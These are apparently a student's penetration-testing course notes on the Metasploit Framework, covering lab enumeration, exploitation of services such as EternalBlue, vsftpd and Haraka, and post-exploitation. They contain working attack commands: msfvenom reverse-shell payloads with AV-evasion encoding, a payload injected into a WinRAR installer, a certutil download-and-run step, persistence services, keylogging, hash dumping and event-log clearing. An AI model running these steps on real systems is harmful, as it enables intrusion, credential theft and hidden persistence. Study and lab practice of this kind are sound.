---
id: mygsa7de4w4cdxcab16gssu
title: Metasploit_framework
desc: ''
updated: 1675114899656
created: 1675114516465
---
# Metasploit Framework

## Overview

### Introduction

* Metasploit released to public on 2003
* latest release Metasploit 6.0 (2020)
* Metasploit Pro (commercial)
* Metasploit Express (commercial)
* Metasploit Community (open source free version, used in this course)
* Keywords:
    * Interface: Methods of interacting with Metasploit
        * msfconsole: command center, primary console
        * metasploit framework CLI: discontinued, all func moved to msfconsole
        * Metasploit community edition GUI: GUI on top of msfconsole
        * Armitage: Free java based GUI for msfconsole
    * Module: Pieces of code that perform a task
    * Vulnerability: weakness or flaw in a computer system or network
    * Exploit: Piece of code/module that is used to take advantage of the vulnerability
    * Payload: piece of code delivered to target by an exploit
    * Listener: A utility that listens for an incoming connection from a target

### Metasploit Architecture

![metasploit_arch](/notes/assets/images/metasploit_framework/metasploit_arch.png)

#### MSF Modules

* Exploit: A module that is used to take advantage of a vulnerability and is typically paired with a payload
* Payload: Code that is delivered by MSf and remotely executed on the target after successful exploitation. Ex: reverse shell
    * Non Staged Payload: sent to target as a whole and executed
    * Staged Payload: send to target as two part operation
        * first part (stager): used to establish reverse connection back to attacker and download the second part (payload)
        * second part(stage): provides stable reverse shell or meterpreter
    * Meterpreter: A multifunctional payload that is executed in memory. Executes over a stager socket and provides interactive command line.
* Encoder: used to encode payload to evade AV detection. ex: shikata_ga_nai is used to encode windows payloads
* NOPS: used to ensure that payload size are consistant and ensures stability of payload
* Auxiliary: A module that is used to perform additional functionality like port scanning and enumeration. CANNOT be paired with a payload

### MSF File Structure

* /usr/share/metasploit-framework (main directory)
* Modules stored in /usr/share/metasploit-framework/modules
    * custom modules in ~/.msf/modules
* /usr/share/metasploit-framework
    * /modules: 
        * /auxiliary:
            * several types for ex: /scanner
        * /exploits: sorted by os, software
            * /linux: sorted by service
                * /mysql
            * /windows:
                * /mssql
        * /NOPS , /encoders etc

### Penetration testing with Metasploit

* phases of penetration testing
    * Penetration Testing Execution Standard (PTES): A standard to define the process
        * http://www.pentest-standard.org/index.php/Main_Page
        * https://github.com/penetration-testing-execution-standard

    ![penetration_testing_phases](/notes/assets/images/metasploit_framework/penetration_testing_phases.png)

    ![metasploit_modules_for_phases](/notes/assets/images/metasploit_framework/metasploit_modules_for_phases.png)


## Metasploit Fundamentals

### Installation and configuration

* supports windows and linux, comes preinstalled with Kali linux
* msfdb, persistant storage to store all activity
    * uses postgresql
* configuration (kali linux)
    * sudo apt-get update && sudo apt-get install metasploit-framework -y
    * sudo systemctl enable postgresql 
    * sudo systemctl start postgresql
    * sudo msfdb (cli to manage DB)
        * sudo msfdb init 
        * sudo msfdb status
    * msfconsole (to start)

### MSFConsole Fundamentals

* Module Variables: Args passed to modules. ex: rhosts, rport etc
    * LHOST: IP address of attacker system or listening post
    * LPORT: port of attacker system or listening post
    * RHOST: IP of target/victim system. Can store network ranger or multiple IPs
    * RPORT: target port
* show <arg>: displays the available modules.
* <cmd> -h: help menu of any cmd can be accessed by passing -h flag
* search <keyword>: search for modules with keyword
    * search cve:2017 type:exploit platform:windows
        * search all cve exploits from 2017 for windows
* use <path/id>: load the module
    * show options (or just options)
    * set <var> <value>: sets the value for variable, ex: set rhosts 192.168.1.1
    * run: runs the module
    * back: unloads the module
    * some modules require payloads, msfconsole sets defaults automatically.
        * set payload <path/to/payload> can be used to change the payload
        * payloads have thier respective args/options, which can be seen in show options menu
* sessions : show active sessions
* connect <host> <port>: connects to targets similar to telnet

### Creating and Managing Workspaces

* Create workspace for every engagement
* workspace: shows current workspace
    * workspace -h : show help menu
    * hosts : shows current hosts 
    * workspace -a Test: creates a new workspace and sets as current workspace
    * workspace <name>: change the workspace
    * workspace -d <name>: deletes the workspace

### Importing Nmap results to MSF

* export nmap results to XML
    * nmap -Pn -sV -O <target_ip> -oX output_file
* open msfconsole
    * db_import <nmap_output_file>
    * hosts : will show the target host
    * services : will show the fingerprinted services
* nmap can also be run from msfconsole
    * db_nmap -Pn -sV -O <target_ip>: will achieve the same result

## Enumeration

data acquired during enumeration is saved automatically in database, common cmds to retrieve the information:

* hosts
* services
* creds
* loot

### Port Scanning with Auxiliary modules

![victim_infra](/notes/assets/images/metasploit/victim_infra_metasploit_port_scanning.png)


* start postgresql & msfconsole
* port scan and exploit primary target
    * search portscan
    * use auxialiary/scanner/portscan/tcp; set rhosts <target>; run
    * discovered webapp running on port 80
        * curl <target> reveals xoda running on primary target
    * exploiting xoda to gain access to target
        * search xoda; use exploit/unix/webapp/xoda_file_upload; set rhosts <target>; set targeturi <path>; run;
        * results in a meterpreter session
* private network discovery from primary target
    * from meterpreter
        * shell; /bin/bash -i
            * ifconfig; copy eth1 subnet
            * terminate shell ctrl+c
        * run autoroute -s <primary_target_ip_eth1>
        * put meterpreter session in background --> background/ctrl+z
    * from attacker system
        * use auxialiary/scanner/portscan/tcp; set rhosts <secondary_target>; run
        * This reveals services on secondary target
* UDP scans
    * search udp_sweep; use auxiliary/scanner/discovery/udp_sweep; set rhosts <target>; run
* all the progress will be saved in metasploit
    * services; will reveal all the services fingerprinted on all hosts

### FTP Enumeration

* service postgresql start && msfconsole
* ftp fingerprinting
    * search portscan; use auxiliary/scanner/portscan/tcp; set rhosts <target>; run;
    * search type:auxiliary ftp; use auxiliary/scanner/ftp/ftp_version; set rhosts <target>; run;
    * use auxiliary/scanner/ftp/ftp_login; set rhosts <target>; set user_file <path>; set pass_file <path>; run --> bruteforce login
    * use auxiliary/scanner/ftp_ftp_anonymous; set rhosts <target>; run
    * login to ftp using compromised credentials

### SMB Enumeration

* skipped, as it is already covered in general enumeration modules.
* refer [[enumerating_smb]]

### Webserver Enumeration

modules used:

* auxiliary/scanner/http/http_version
* auxiliary/scanner/http/http_header
* auxiliary/scanner/http/robots_txt
* auxiliary/scanner/http/dir_scanner; default options ok
* auxiliary/scanner/http/files_dir; default options ok
* auxiliary/scanner/http/http_login; set auth_uri;
    * set user_file <path>; set pass_file <path>; unset userpass_file; run
* auxiliary/scanner/http/apache_userdir_enum (detects usernames on Apache by bruteforce)
    * set user_file <path>; run

### MYSQL Enumeration

modules used:

* auxiliary/scanner/mysql/mysql_version
* auxiliary/scanner/mysql/mysql_login
    * set username root; set pass_file; run
* auxiliary/admin/mysql/mysql_enum --> enumerates information from mysql database like users, hashes, version etc
    * set username <user>; set password <pass>; run
* auxiliary/admin/mysql/mysql_sql --> used to run sql queries
    * set username <user>; set password <pass>; run
* auxiliary/scanner/mysql/mysql_schemadump
    * set username <user>; set password <pass>; run
* access all the above info using:
    * hosts
    * services
    * creds
    * loot

### SSH Enumeration

* skipped, this module is covered is general enumeration
* Refer [[enumerating_ssh]]

### SMTP Enumeration

search type:auxiliary smtp

modules used:

* auxiliary/scanner/smtp/smtp_version
* auxiliary/scanner/smtp/smtp_enum

## Vulnerability Scanning

### Vuln scanning with MSF

* lab enironment Metasploitable3 setup: https://bit.ly/3kASwns

process:

* fingerprint using nmap or msfconsole auxiliary
* for every service that was identified, vuln research can be done using msfconsole inbuilt search or searchsploit utility on kali

tools:
* msfconsole
    * inbuilt search
    * analyze cmd
        * automatches exploits to fingerprint and suggests next steps
* searchsploit
* https://github.com/hahwul/metasploit-autopwn 
    * setup:
        * download the ruby exec
        * mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
    * usage:
        * from msfconsole
        * load db_autopwn
        * ex: db_autopwn -p -t -PI 445

### Vuln scanning with Nessus

* install and setup free version of nessus
* Run basic network scan
    * adjust configuration
    * run
* Nessus performs vulnerability assessment
    * nessus has a filter for vulns with metasploit exploits
* import nessus scan to msfconsole
    * export from nessus
        * export -> xml file
    * from msfconsole
        * db_import path/to/nessus.xml
        * check all the details using below cmds:
            * hosts
            * services
            * vulns
                * vulns -p 445 --> gives vulns for port 445 (SMB)
* from the vulns discovered by nessus, exploits can be searched by CVE numbers

### Web Application vuln scanning with WMAP

* WMAP is msf plugin, should be installed by default

Usage:
* load wmap from msfconsole
    * wmap_sites -a <target>
        * wmap_sites -l --> shows all the sites onboarded
    * wmap_targets -t http://<ip>
    * wmap_run -t --> shows all aux modules enabled for target
    * wmap_run -e --> start testing the target
* the demo lab:
    * the wmap_run reveals the presence of /data folder
    * use auxiliary/scanner/http/http_put
        * this module works, suggesting vulnerability with upload and RCE, if a reverse shell or webshell is upload

## Client Side Attacks

A client side attack is an attack vector that involved coercing a client to execute a malicious payload on thier system that consequently connects back to the attacker when executed.

This is different from host/system based attack, this style of attack takes advantage of human vulns as opposed to vulns in a host/service. ex: via social engineering

### Generating payloads with Msfvenom

* msfvenom comes pre-installed
* msfvenom can generate as well as encode payload
* sample windows payload
    * msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 -f exe > ~/payloadx86.exe
* list output formats
    * msfvenom --list formats
* sample linux payload
    * msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 -f elf > ~/linux_payloadx86.elf
* to setup listener on metasploit
    * use multi/handler
    * set payload <payload>; set LHOST <self_ip>; set LPORT <self_port>; run --> these values should be the same as when msfvenom args used while generating the payload

### Encoding payload with msfvenom

* msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/payloadx86_shikata_ga_nai.exe
* msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/payloadx86_shikata_ga_nai_10_iterations.exe (This one has 10 iterations, more iteration help with evasion)

### Injecting payloads into windows portable executables

* Injecting into winRAR executable
    * download the original winrar executable
    * msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar-x32-611.exe > ~/payloads/winrar-x32-611-payload.exe
    * `-k` option can be used to keep the original behaviour of the executable, however, most of the executables donot allow it. So `-k` flag doesn't work with winrar

## Automating

### Automating metasploit with resource scripts

```handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 1234
run
```

To run:

msfconsole -r handler.rc

Another Example

```port_scan.rc
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1
run
```

load resource script from within msfconsole

resource /path/to/hander.rc

to export commands to handler script from within msfconsole: makerc /path/to/script.rc


## Windows Exploitation

### Exploiting a vulnerable HTTP File Server

from msfconsole:

* setg rhosts <target>
* db_nmap -sV -O <target>
    * This shows a HttpFileServer 2.3 running on target
* search type:exploit name:HttpFileServer
    * shows an exploit for rejetto file server tested on v2.3
    * We could verify this claim my opening the target file server in browser and looking for software version information if available
* Running the above mentioned exploit will provide a meterpreter sesion into the system

### Exploiting Windows MS17-010 SMB Vulnerability 

* MS17-010 - EternalBlue
* used by WannaCry Ransomware campaign
* Affects a wide variety of window
* exploiting this vuln will result in a privileged meterpreter session
* exploitation
    * db_nmap -sV -O <target>
        * verify it is running SMB
    * search type:auxiliary EternalBlue
        * use auxiliary/scanner/smb/smb_ms17_010; set rhosts <target>; run
    * search type:exploit EternalBlue
        * use exploit/windows/smb/ms17_010_eternal_blue; set rhosts; set lhosts; set lport; run
        * results in a meterpreter session
            * getuid --> NT AUTHORITY/SYSTEM

### Exploiting WinRM

* This is covered in windows os attacks
* [[windows_host_based_attacks]]
* runs on 5985/5986
* modules:
    * auxiliary/scanner/winrm/winrm_auth_methods
    * auxiliary/scanner/winrm/winrm_login
        * set USER_FILE common_user.txt; set PASS_FILE unix_password.txt
    * auxiliary/scanner/winrm/winrm_cmd
        * set USERNAME; set PASSWORD; set CMD <cmd>; run
    * exploit/windows/winrm/winrm_script_exec
        * set FORCE_VBS true; run
        * results in a meterpreter session

### Exploiting JAVA web server

* exploiting Apache Tomcat webserver
    * default port 8080
* use exploit/multi/http/tomcat_jsp_upload_bypass
    * set rhosts; run
    * this will result in a cmd shell
* Convert to meterpreter session
    * msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=10.10.80.2 LPORT=1234 -f exe > meterpreter.exe
    * sudo python -m simpleHTTPServer 80
    * setup reverse_tcp listener in msfconsole
        * use multi/handler
        * set lport; set lhosts (same as msfvenom)
        * download payload thourh cmd shell
            * certutil -urlcache -f http://<lhosts>/meterpreter.exe
            * run .\meterpreter.exe
            * will result in a meterpreter session

## Linux Exploitation

### Exploiting FTP

* from msfconsole
* db_nmap -sV -O <target> --> to confirm ftp server and the version
* search type:exploit vsftpd --> There is a backdoor vulnerability in vsftpd 2.3.4 that allows RCE
* use exploit/unix/ftp/vsftpd_234_backdoor
    * set RHOSTS; set port; run (might require multiple tries)
    * This results in cmd shell
        * type /bin/bash -i (to open a bash shell for ease of use)
    * use post/multi/manage/shell_to_meterpreter (To convert the shell to meterpreter)
        * set LHOST eth1
        * set SESSION 1 (The session running bash shell)

### Exploiting Samba

* Runs on 445 but legacy system ran on NETBOIS on 139
* db_nmap -sV -O <target> --> to confirm Samba server and the version
    * did not reveal the specific version, only returned Samba smbd 3.X - 4.X workgroup: WORKGROUP
* search type:expoit samba
* use exploit/linux/samba/is_known_pipename (triggers an arbitrary shared library load vuln in samba)
    * set rhosts; run
    * results in a cmd shell
    * put the cmd shell in background
    * use post/multi/manage/shell_to_meterpreter (To convert the shell to meterpreter)
        * set LHOST eth1
        * set SESSION 1 (The session running cmd shell)

### Exploiting SSH

*  db_nmap -sV -O <target> --> reveals the server is running libssh 0.8.3 (vulnerable to auth bypass)
* search libssh_auth_bypass (auxiliary module, but can result in a shell)
    * use auxiliary/scanner/ssh/libssh_auth_bypass;
        * set rhosts <target>; set SPAWN_PTY true; run
        * will result in a shell session
    * search shell_to_meterpreter
        * use post/multi/manage/shell_to_meterpreter (To convert the shell to meterpreter)
        * set LHOST eth1
        * set SESSION 1 (The session running cmd shell)

### Exploiting SMTP

* uses port 25. Can be configured to run on 465 and 587
* The has a vulnerable haraka SMTP server (>v2.8.9 vulnerable to cmd injection)
* db_nmap -sV <target>
    * reveals Haraka smtpd 2.8.8
* search type:exploit haraka
    * use exploit/linux/smtp/haraka
        * set SRVPORT 9898 --> I think this is a SMTP callback server
        * set email_to root@attackdefence.test
        * set payload linux/x64/meterpreter_reverse_http (Unstaged payload)
            * set LHOST eth1
            * set LPORT 8080
        * run
            * this opens up a meterpreter session

## Post Exploitation fundamentals

* post Exploitation
    * Priv Escalation
    * Maintain persistance
    * cleanup

### Meterpreter Fundamentals

* Stands for Meta Interpreter
* Executes in memory

lab:
* db_nmap -sV <target>
    * reveals Apache running
    * curl <target>
        * reveals XODA
* search XODA
    * use exploit/unix/webapp/xoda_file_upload
    * results in a meterpreter session
* Meterpreter fundamentals
    * help : for help
    * sysinfo : gets basic host info
    * getuid: get user info
    * ctrl+z or background : puts the session into background
    * sessions or sessions -l : lists all active sessions in msfconsole
    * sessions -h: for help info in sessions
    * sessions -C sysinfo -i 1: runs sysinfo on session 1
    * cat, cd, mkdir, rmdir: file operations
    * download <file>: downloads the file to local
    * shell: opens a native shell session on target (native to target)
        * /bin/bash -i (opens bash)
    * getenv env_name: get env values
    * search -d /usr/bin -f *backdoor*: search for filename with backdoor in /usr/bin
        * search -f *php: search for php files system wide
    * ps: list all processess
    * migrate <pid>: migrate the meterpreter process to given PID. This cmd will not always be successful, it depends on permissions of compromized service

### Upgrading cmd shell to meterpreter

* two options
    * 1:
        * search shell_to_meterpreter
        * use /post/multi/manage/shell_to_meterpreter
        * set LHOST <local_ip>; set SESSION <id>; run
    * 2:
        * sessions -l
        * sessions -u <id> (Automatically runs the post exploitation module and upgrades the session)

## Windows post exploitation

### modules & meterpreter fundamentals

* post/windows/manage/migrate
* post/windows/gather/win_privs
* post/windows/gather/enum_logged_one_users
* post/windows/gather/checkvm
* post/windows/gather/enum_applications
* post/windows/gather/enum_av_excluded
* post/windows/gather/enum_computers
* post/windows/gather/enum_patches (sometime fails)
    * incase of failure
        * shell
            * systeminfo
* post/windows/gather/enum_shares
* post/windows/manage/enable_rdp

meterpreter cmds:

* hashdump
* getsystem: try to priv escalation to NT AUTH SYSTEM
* migrate <id>

msfconsole:

* loot: will reveal all post recon data

### Windows Privilege Escalation: bypassing User Account Control (UAC)

* basics of UAC are already covered in Windows Exploitation module
* [[link here]]

provided we have a meterpreter session:

* getuid
    * VICTIM/admin
* getsystem
    * all automated TTPs fails
* getprivs
    * did not reveal many details
* inorder for UAC bypass to work, the compromised users has to be in Administrators local group
    * shell
        * net users
            * will give all the user accounts
        * net localgroup administrators
            * admin is a part of Administrators group, which is a pre-req for UAC bypass
* search bypassuac
    * use exploit/windows/local/bypassuac_injection
        * set payload windows/x64/meterpreter/reverse_tcp (x64 is required)
        * set LPORT 1234 (diff port from session 1)
        * run
            * fails with platform mismatch error
        * set TARGET Windows\ x64
        * run (SUCCESS)
        * a different meterpreter session is opened with UAC disabled
        * getsystem (SUCCESS)
            * elevated privs obtained, because UAC was disabled

### Skipped

* Windows Privilege Escalation:Token Impersonation With Incognito 
* Dumping Hashes With Mimikatz
* Pass-the-Hash With PSExec
 
All the above were covered in windows exploitation section [[link here]]

### Establising Persistence on windows

prereq: meterpreter session already openned on target

* put the meterpreter to background
* search platform:windows persistence
    * use exploit/windows/local/persistence_service (This module is very stable and spawns a new service to maintain connection back to C2)
    * set session <id>
    * set payload windows/meterpreter/reverse_tcp (only works with 32 bit meterpreter)
    * set LHOSTS ; set LPORT ; run
    * This will result in a meterpreter session. At this point a persistant connection is established. Even if the meterpreter session is closed/restarted, the target will automatically reach back to set LHOST and LPORT. Since this module spawns a new service, this is resistant to restarts or config change on target.
    * NOTE: I noticed there is no passphrase/password set for reverse_tcp connections, there are also no option to provide these on this module. This can be risky if the attackers IP is acquired by an adversary. Extra attention is needed while using this.

### Enabling RDP

Prereq: meterpreter session already opened on target

* search enable_rdp
    * use post/windows/manage/enable_rdp
    * set SESSION <id>
    * it is recommended to create a new user & password
    * run
    * RDP is now enabled
    * reset Administrator password (Next time the actual administrator wont be able use thier own password, which is a clear giveaway that the system is compromised)
        * open meterpreter
        * shell
            * net user administrator new_password
    * xfreerdp /u:administrator /p:owned_12321 /v:10.4.18.148
    
### Windows file and keylogging

prereq: meterpreter

* from within meterpreter
    * keyscan_start : starts capturing
    * keyscan_dump : dump all the capture inputs ( all keyboard input will be captured, it doesn't matter which application was used)

### Windows: Clearing event logs

Application Logs: stores app/prog events like startups, crashes etc
System Logs: Stores system events like startup, reboots etc
Security Logs: Stores security events like password changes, authentication failures etc

* logs can be viewed using Event Viewer on Windows
* This is a first step that a investigator will take, review event logs

from within meterpreter:

* clearev: will clear all the event logs. Needs admin access

### Pivoting

use of compromised host to attack other hosts in internal network

![pivoting](/assets/images/pivoting.png)

* From the diagram, only vitcim-1 is visible to attacker system. Victim-2 can only be accessed through victim-1's private network
* Exploiting victim-1
    * db_nmap -sV victim-1
    * use post/windows/http/badblue_passthru; run
        * results in meterpreter
    * from meterpreter
        * ipconfig: identify victim's address and subnet
        * add autoroute -s victim-1's_IP_subnet
            * This autoroute will cater to all the metasploit modules, the victim-2's Ip can now be reached by any native metasploit module
            * We won't be able to use nmap service detection on victim-2, because it is not a metasploit native module
        * portfwd add -l 1234 -p 80 -r victim-2's_IP
            * This will port forward the 80 on victim-2's IP to attacker's local port 1234
            * This will allow nmap service detection
                * db_nmap -sV -p 1234 localhost (Since the victim-2's 80 is forwarded to localhost:1234)
* victim-2 exploitation
    * db_nmap -sV -p 1234 localhost
    * use post/windows/http/badblue_passthru
        * set RHOSTS victim-2
        * set LPORT <use a diff port than session 1>
        * keep the RPORT to 80, because autoroute is already configured
        * set payload windows/meterpreter/bind_tcp (reverse_tcp will not work, need research on why)
        * run
            * results in a meterpreter session

## Linux Post Exploitation

### linux post exploitation modules

* local linux enum - manual:
    * cat /etc/passwd
    * cat /etc/*release
    * uname -a
    * env
    * netstat -antp
* modules
    * post/linux/gather/enum_configs
    * post/multi/gather/env
    * post/linux/gather/enum_network
    * post/linux/gather/enum_protections
    * post/linux/gather/enum_system
    * post/linux/gather/checkcontainer
    * post/linux/gather/checkvm
    * post/linux/gather/enum_users_history
    * post/multi/manage/system_session
    * post/linux/manage/download_exec
* msfcommands to show collected information
    * loot: all sensitive information collected by msfconsole
    * notes: information collected with post exploitation modules

### Linux privilege Escalation:Exploiting a vuln program

* Gain access to target:
    * SSH creds were given for lab
    * use auxiliary/scanner/ssh/ssh_login
        * set USERNAME <user>; set PASSWORD <pass>
        * this results in a cmd shell
    * upgrade the cmd shell to meterpreter (ignore the errors). This is required for most of the metasploit post exploitation modules
        * sessions -u <id>
    * from meterpreter, perform local recon
        * whoami
        * uname -a
        * cat /etc/passwd
        * ifconfig
        * ps aux
            * identified a program started by root
                * cat /bin/check_down reveals that it is a script running chkrootkit
        * chkrootkit < .5v are vulnerable to priv esc vuln
        * ctrl+z
    * search chkrootkit
        * use exploit/unix/local/chkrootkit
        * provide the path to chkrootkit binary
        * set LHOST; set LPORT; run (Ignore the errors)
        * this results in a privileged cmd shell

### Dumping hashes with Hashdump

* after meterpreter session has been established
* use  post/linux/gather/hashdump
    * set SESSION <id>
    * run
* the hashes are present in loot
    * loot: will provide the hashdump

### Establishing persistance on linux

* Depends on linux distribution
* step 1: gain access to system, lab showed exploitation of samba vulnerability
    * this results in a cmd shell
    * upgrade the cmd shell to meterpreter
        * sessions -u 1
* step 2: priv esc. The lab had a vulnerable chkrootkit running
    * use exploit/unix/local/chkrootkit
        * this results in a elevated cmd shell
        * upgrade the cmd to meterpreter
            * sessions -u 3
* Step 3 persistence:
    * manual:
        * option 1: create a user account and setup ssh with password/public key auth. The main thing here is not to stand out, try to setup as if it is a service account.
        * option 2: add ssh keys to existing account. Probably a better approach.
    * metasploit:
        * search platform:linux persistence --> The persistence modules on linux are hit and miss because of the various linux distributions. It will a lot of trial and error
        * post/linux/manage/sshkey_persistence --> was a success, it automates addition of public keys to linux users

## Armitage

GUI for msfconsole

to start:
* start postgresql start && msfconsole
* in a another terminal execute "armitage"
    * This will start the msfrpc deamon and connect to it

### portscanning and Enumeration

* Add host from host menu
* right click on host and click scan
* nmap scan is also present under hosts menu in top
    * quickscan + OS will perform service detection and OS detection

### Exploitation and post exploitation

* All the same steps as the pivoting session, exept. It was on Armitage
* Armitage was slow
* just skip it and use msfconsole